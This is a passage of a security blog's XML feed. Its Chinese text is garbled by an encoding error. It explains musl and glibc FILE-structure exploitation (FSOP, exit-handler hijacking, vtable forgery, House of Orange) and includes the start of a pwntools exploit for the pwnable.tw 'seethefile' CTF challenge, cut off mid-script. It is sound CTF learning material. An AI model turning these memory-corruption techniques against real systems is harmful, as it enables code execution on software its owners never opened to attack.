title="æ”¹é€  sh"></a>æ”¹é€  sh</h3><p>#todo</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å¼€å­¦ï¼&lt;/p&gt;</summary>
    
    
    
    <category term="Course" scheme="https://humoooor.cn/categories/Course/"/>
    
    <category term="MIT 6.1810 2022Fall" scheme="https://humoooor.cn/categories/Course/MIT-6-1810-2022Fall/"/>
    
    
    <category term="Operating System" scheme="https://humoooor.cn/tags/Operating-System/"/>
    
    <category term="RISC-V" scheme="https://humoooor.cn/tags/RISC-V/"/>
    
    <category term="Xv6" scheme="https://humoooor.cn/tags/Xv6/"/>
    
  </entry>
  
  <entry>
    <title>Musl libc Exploration</title>
    <link href="https://humoooor.cn/2022/10/11/Musl%20libc%20Exploration/"/>
    <id>https://humoooor.cn/2022/10/11/Musl%20libc%20Exploration/</id>
    <published>2022-10-11T08:41:00.000Z</published>
    <updated>2023-03-31T08:03:05.300Z</updated>
    
    <content type="html"><![CDATA[<p>æŒç»­æ›´æ–°ï¼ˆæˆ–è®¸ï¼‰</p><span id="more"></span><p>ç¯å¢ƒï¼šx64 musl-1.2.2</p><h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><h3 id="FILE-ç»“æ„"><a href="#FILE-ç»“æ„" class="headerlink" title="FILE ç»“æ„"></a>FILE ç»“æ„</h3><figure class="highlight c"><figcaption><span>./src/internal/stdio_impl.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *rpos, *rend;</span><br><span class="line"><span class="type">int</span> (*close)(FILE *);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *wend, *wpos;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *mustbezero_1;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *wbase;</span><br><span class="line"><span class="type">size_t</span> (*read)(FILE *, <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line"><span class="type">size_t</span> (*write)(FILE *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line"><span class="type">off_t</span> (*seek)(FILE *, <span class="type">off_t</span>, <span class="type">int</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *buf;</span><br><span class="line"><span class="type">size_t</span> buf_size;</span><br><span class="line">FILE *prev, *next;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">int</span> pipe_pid;</span><br><span class="line"><span class="type">long</span> lockcount;</span><br><span class="line"><span class="type">int</span> mode;</span><br><span class="line"><span class="keyword">volatile</span> <span class="type">int</span> lock;</span><br><span class="line"><span class="type">int</span> lbf;</span><br><span class="line"><span class="type">void</span> *cookie;</span><br><span class="line"><span class="type">off_t</span> off;</span><br><span class="line"><span class="type">char</span> *getln_buf;</span><br><span class="line"><span class="type">void</span> *mustbezero_2;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *shend;</span><br><span class="line"><span class="type">off_t</span> shlim, shcnt;</span><br><span class="line">FILE *prev_locked, *next_locked;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> *<span class="title">locale</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ç›¸æ¯” glibc çš„ FILE ç»“æ„ï¼Œmusl libc çš„ FILE ç»“æ„æ›´åŠ ç®€å•ï¼Œä¹Ÿæ›´å®¹æ˜“åˆ©ç”¨</p><p>æœ‰å››ç±» FILE æŒ‡é’ˆï¼šofl_headã€stdinã€stdoutã€stderr</p><ul><li>ofl_head<ul><li>ç±»ä¼¼ glibc çš„ _IO_list_allï¼Œæ‰“å¼€çš„æ–‡ä»¶é“¾è¡¨å¤´ï¼Œä¸ºå…¨å±€å˜é‡</li><li>å¯ä»¥ç›´æ¥åŠ«æŒåˆ°ä¼ªé€ çš„ FILE ç»“æ„</li></ul></li><li>stdinã€stdoutã€stderr<ul><li>å›ºå®šçš„ä¸‰ä¸ª FILE æŒ‡é’ˆï¼Œä¸å¯åŠ«æŒ</li><li>å¯ä»¥æ›´æ”¹å…¶æŒ‡å‘çš„å†…å­˜ç©ºé—´</li></ul></li></ul><h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><figure class="highlight c"><figcaption><span>./src/stdio/__stdio_exit.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">close_file</span><span class="params">(FILE *f)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!f) <span class="keyword">return</span>;</span><br><span class="line">FFINALLOCK(f);</span><br><span class="line"><span class="keyword">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __stdio_exit(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">FILE *f;</span><br><span class="line"><span class="keyword">for</span> (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);</span><br><span class="line">close_file(__stdin_used);</span><br><span class="line">close_file(__stdout_used);</span><br><span class="line">close_file(__stderr_used);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ <code>exit()</code> æ—¶ä¼šè°ƒç”¨ <code>__stdio_exit()</code> ï¼Œå…¶ä¸­ <code>close_file()</code> ä¼šè°ƒç”¨ FILE çš„ä¸¤ä¸ªå‡½æ•° <code>write</code> å’Œ <code>seek</code></p><p>FSOP æ¡ä»¶</p><ul><li>f-&gt;lock == 0<ul><li>ä¸ä¸º 0 ä¼šè°ƒç”¨ futex ç³»ç»Ÿè°ƒç”¨ï¼Œç„¶åå¯„äº†</li></ul></li><li>flags == â€œ/bin/sh\x00â€<ul><li>è°ƒç”¨çš„ç¬¬ä¸€ä¸ªå‚æ•°éƒ½æ˜¯ FILE æŒ‡é’ˆï¼Œåœ¨åŠ«æŒä¸º <code>system</code> æ—¶ï¼Œå°† flags æ”¹ä¸º <code>/bin/sh\x00</code> å³å¯</li></ul></li><li>è°ƒç”¨ write<ul><li>wpo != wbase</li></ul></li><li>è°ƒç”¨ seek<ul><li>rpos != rend</li></ul></li></ul><h2 id="exit-hijack"><a href="#exit-hijack" class="headerlink" title="exit hijack"></a>exit hijack</h2><p>ğŸ§å¸ˆå‚…æåŠçš„</p><p>ç¬”è€…è‡ªå·±èµ·çš„åï¼ˆ</p><figure class="highlight c"><figcaption><span>./src/exit/atexit.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> COUNT 32</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">fl</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fl</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">void</span> (*f[COUNT])(<span class="type">void</span> *);</span><br><span class="line"><span class="type">void</span> *a[COUNT];</span><br><span class="line">&#125; builtin, *head;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> slot;</span><br><span class="line"><span class="type">static</span> <span class="keyword">volatile</span> <span class="type">int</span> lock[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">volatile</span> <span class="type">int</span> *<span class="type">const</span> __atexit_lockptr = lock;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __funcs_on_exit()</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">void</span> (*func)(<span class="type">void</span> *), *arg;</span><br><span class="line">LOCK(lock);</span><br><span class="line"><span class="keyword">for</span> (; head; head=head-&gt;next, slot=COUNT) <span class="keyword">while</span>(slot--&gt;<span class="number">0</span>) &#123;</span><br><span class="line">func = head-&gt;f[slot];</span><br><span class="line">arg = head-&gt;a[slot];</span><br><span class="line">UNLOCK(lock);</span><br><span class="line">func(arg);</span><br><span class="line">LOCK(lock);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ <code>exit</code>() æ—¶ï¼Œä¼šè°ƒç”¨ <code>__funs_on_exit()</code> é€šè¿‡ head æŒ‡é’ˆæ‰§è¡Œæ³¨å†Œçš„ç»ˆæ­¢å‡½æ•°</p><p>åˆ©ç”¨æ¡ä»¶</p><ul><li>å°† head åŠ«æŒåˆ°å¯æ§å†…å­˜ç©ºé—´<ul><li>ç¬¬ä¸€ä¸ªå¾ªç¯å› ä¸º slot == 0ï¼Œä¼šç›´æ¥è·³è¿‡</li><li>ä»è€Œ head  = head-&gt;next</li></ul></li><li>*(head-&gt;next + 0x100) ==  addr_system</li><li>*(head-&gt;next + 0x200) == addr_binsh</li></ul><p>åœ¨ç†æƒ³çš„å †é£æ°´æƒ…å†µä¸‹ï¼Œåªéœ€è¦ä»»æ„å†™ä¸€æ¬¡ï¼Œå³å¯é€šè¿‡ <code>exit()</code> æ‹¿åˆ° shell</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;æŒç»­æ›´æ–°ï¼ˆæˆ–è®¸ï¼‰&lt;/p&gt;</summary>
    
    
    
    <category term="Exploration" scheme="https://humoooor.cn/categories/Exploration/"/>
    
    
    <category term="Pwn" scheme="https://humoooor.cn/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>FILE Exploration</title>
    <link href="https://humoooor.cn/2022/10/11/FILE%20Exploration/"/>
    <id>https://humoooor.cn/2022/10/11/FILE%20Exploration/</id>
    <published>2022-10-11T03:15:00.000Z</published>
    <updated>2023-03-31T08:10:16.338Z</updated>
    
    <content type="html"><![CDATA[<p>ç³»ç»Ÿåœ°å­¦ä¸€ä¸‹ glibc æ–‡ä»¶ç»“æ„çš„æ´</p><span id="more"></span><h2 id="FILE-ç»“æ„"><a href="#FILE-ç»“æ„" class="headerlink" title="FILE ç»“æ„"></a>FILE ç»“æ„</h2><figure class="highlight c"><figcaption><span>./libio/libio.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ./libio/libioP.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>_IO_FILE<ul><li>_flags<ul><li>è®°å½•æ–‡ä»¶æµçš„å±æ€§<ul><li>Read only</li><li>Append</li><li>â€¦</li></ul></li></ul></li><li>Stream buffer<ul><li>Read buffer<ul><li>_IO_read_ptr</li><li>_IO_read_end</li><li>_IO_read_base</li></ul></li><li>Write buffer<ul><li>_IO_write_ptr</li><li>_IO_write_end</li><li>_IO_write_base</li></ul></li><li>Reserve buffer<ul><li>_IO_buf_base</li><li>_IO_buf_end</li></ul></li></ul></li><li>_fileno<ul><li>æ–‡ä»¶æè¿°ç¬¦</li></ul></li><li>_chain<ul><li>FILE ç»“æ„ä½“æ˜¯ä¸€ä¸ªå°¾æ’æ³•å•å‘é“¾è¡¨ï¼Œé»˜è®¤æœ‰ stderr -&gt; stdout -&gt; stdin</li></ul></li><li>_lock<ul><li>é¿å…å¤šçº¿ç¨‹çš„æ¡ä»¶ç«äº‰</li><li>åœ¨æ”»å‡»æ—¶é€šå¸¸éœ€è¦æ„é€ å®ƒ<ul><li>ä½¿å…¶æŒ‡å‘ä¸€ä¸ªå…¨æ˜¯0çš„ç©ºé—´</li></ul></li></ul></li></ul></li><li>_IO_FILE_plus<ul><li>stdin/stdout/stderr/fopen ä½¿ç”¨è¿™ä¸ªç»“æ„ä½“</li><li>_IO_FILE</li><li>vtable<ul><li>æ‰€æœ‰å¯¹æ–‡ä»¶çš„æ“ä½œéƒ½æ˜¯é€šè¿‡ vtable</li></ul></li></ul></li></ul><h2 id="fopen-æµç¨‹"><a href="#fopen-æµç¨‹" class="headerlink" title="fopen æµç¨‹"></a>fopen æµç¨‹</h2><ol><li>åˆ†é… FILE ç»“æ„ä½“ç©ºé—´<ul><li>malloc</li></ul></li><li>åˆå§‹åŒ– FILE ç»“æ„ä½“<ul><li>_IO_new_file_init_internal</li></ul></li><li>æŠŠ FILE ç»“æ„ä½“æ”¾å…¥é“¾è¡¨<ul><li>_IO_link_in</li></ul></li><li>æ‰“å¼€æ–‡ä»¶<ul><li>_IO_new_file_open</li><li>sys_open</li></ul></li></ol><h2 id="fread-æµç¨‹"><a href="#fread-æµç¨‹" class="headerlink" title="fread æµç¨‹"></a>fread æµç¨‹</h2><ol><li>å¦‚æœ stream buffer æ˜¯ç©ºçš„<ul><li>vtable -&gt; _IO_file_xsgetn</li><li>åˆ†é… buffer<ul><li>vtable -&gt; _IO_file_doallocate</li></ul></li></ul></li><li>è¯»å–æ•°æ®åˆ° stream buffer ä¸­<ul><li>vtable -&gt; _IO_file_underflow</li></ul></li><li>æŠŠæ•°æ®ä» stream buffer å¤åˆ¶åˆ°ç›®çš„åœ°å€<ul><li>sys_read</li></ul></li></ol><h2 id="fwrite-æµç¨‹"><a href="#fwrite-æµç¨‹" class="headerlink" title="fwrite æµç¨‹"></a>fwrite æµç¨‹</h2><ol><li>å¦‚æœ steam buffer æ˜¯ç©ºçš„<ul><li>vtable -&gt; _IO_file_xsputn</li><li>åˆ†é… buffer<ul><li>vtable -&gt; _IO_file_doallocate</li></ul></li></ul></li><li>å¤åˆ¶ç”¨æˆ·æ•°æ®åˆ° stream buffer</li><li>å¦‚æœ stream buffer æ»¡äº†æˆ–è€…è¦åˆ·æ–° steam bufferï¼Œå°† steam buffer çš„æ•°æ®å†™å…¥æ–‡ä»¶<ul><li>sys_write</li></ul></li></ol><h2 id="fclose-æµç¨‹"><a href="#fclose-æµç¨‹" class="headerlink" title="fclose æµç¨‹"></a>fclose æµç¨‹</h2><ol><li>æŠŠ FILE ç»“æ„ä»é“¾è¡¨ä¸­ç§»é™¤<ul><li>_IO_unlink_it</li></ul></li><li>åˆ·æ–°å¹¶é‡Šæ”¾ stream buffer<ul><li>_IO_new_file_close_it</li><li>_IO_do_flush</li></ul></li><li>å…³é—­æ–‡ä»¶<ul><li>sys_close</li></ul></li><li>é‡Šæ”¾ FILE ç»“æ„<ul><li>vtable -&gt; _IO_file_finish</li><li>free</li></ul></li></ol><h2 id="ä¼ªé€ -vtable"><a href="#ä¼ªé€ -vtable" class="headerlink" title="ä¼ªé€  vtable"></a>ä¼ªé€  vtable</h2><p>ä¼ªé€  FILE ç»“æ„ï¼Œå°† vtable æŒ‡å‘æ„é€ çš„å‡½æ•°</p><ol><li>ä¿®æ”¹ _lock æŒ‡å‘ä¸€ä¸ªå…¨ä¸º 0 çš„å†…å­˜</li><li>æ‰¾åˆ° vtable çš„åç§»</li><li>ä¿®æ”¹ vtable æŒ‡å‘å¯æ§çš„å†…å­˜</li><li>è°ƒè¯•æŸ¥çœ‹ close æ—¶ä¼š call çš„ä½ç½®å’Œ rdi å‚æ•°</li><li>å°†å¯¹åº”ä½ç½®æ”¹æˆ system å’Œ /bin/sh</li></ol><p>æ³¨ï¼šä¸€èˆ¬ rdi çš„å€¼ä¸º _flags + åé¢å››ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥ä¸€èˆ¬å‰ 8 ä¸ªå­—èŠ‚è®¾ç½®ä¸º <code>AAAA;sh;</code></p><h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>File-Stream Oriented Programming</p><ul><li><p>æ§åˆ¶æ–‡ä»¶ç»“æ„é“¾è¡¨</p><ul><li>_chain</li><li>_IO_list_all å…¨å±€å˜é‡ï¼Œé“¾è¡¨å¤´</li></ul></li><li><p>IO_flush_all_lockp</p><ul><li>ç”¨äºåˆ·æ–°æ‰€æœ‰ FILE çš„ç¼“å­˜</li><li>è°ƒç”¨æ¡ä»¶<ul><li>å½“ libc æ‰§è¡Œ abort æ—¶</li><li>å½“æ‰§è¡Œ exit æ—¶</li><li>å½“ä» main è¿”å›æ—¶</li></ul></li><li>åœ¨è°ƒç”¨æ—¶ï¼Œå¦‚æœ <code>fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code> ä¼šè°ƒç”¨ <code>vtable-&gt;_IO_overflow</code></li></ul></li></ul><h2 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h2><ul><li>åˆ©ç”¨ Unsorted bin attack æŠŠ unsorted bin å†™åˆ° _IO_list_all</li><li>æ„é€  0x60 å¤§å°çš„ chunk æ”¾å…¥ small bin</li><li>è°ƒç”¨ _IO_flush_all_lockp æœ‰ 50% æ¦‚ç‡æŠŠ 0x60 å¤§å°çš„ chunk ä½œä¸º FILE ç»“æ„é€ æˆ FSOP</li></ul><h2 id="Pwnable-seethefile"><a href="#Pwnable-seethefile" class="headerlink" title="Pwnable seethefile"></a>Pwnable seethefile</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8046000)</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ç‚¹</p><ul><li>è¯»å– <code>/proc/self/maps</code> å¾—åˆ° libc åœ°å€</li><li>åœ¨ <code>case 5</code> çš„æ—¶å€™ name æº¢å‡ºè¦†ç›– fp åˆ° fake_fileï¼Œ<code>fclose(fp)</code>æ—¶å°±å¯ä»¥ä½¿ç”¨ä¼ªé€ çš„ vtable</li></ul><p>ä¸»è¦éœ€è¦è°ƒè¯•æ‰¾åˆ° _lockã€vtable å’Œè°ƒç”¨ vtable ä¸­çš„å‡½æ•°çš„åç§»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">address = <span class="string">&quot;chall.pwnable.tw:10200&quot;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">filename = <span class="string">&quot;./&quot;</span> + __file__[<span class="number">0</span>:-<span class="number">3</span>]</span><br><span class="line">elf = ELF(__file__[<span class="number">0</span>:-<span class="number">3</span>])</span><br><span class="line">p = remote(address[<span class="number">0</span>], address[<span class="number">1</span>])</span><br><span class="line"><span class="comment"># p = process(__file__[0:-3])</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fopen</span>(<span class="params">filename</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span 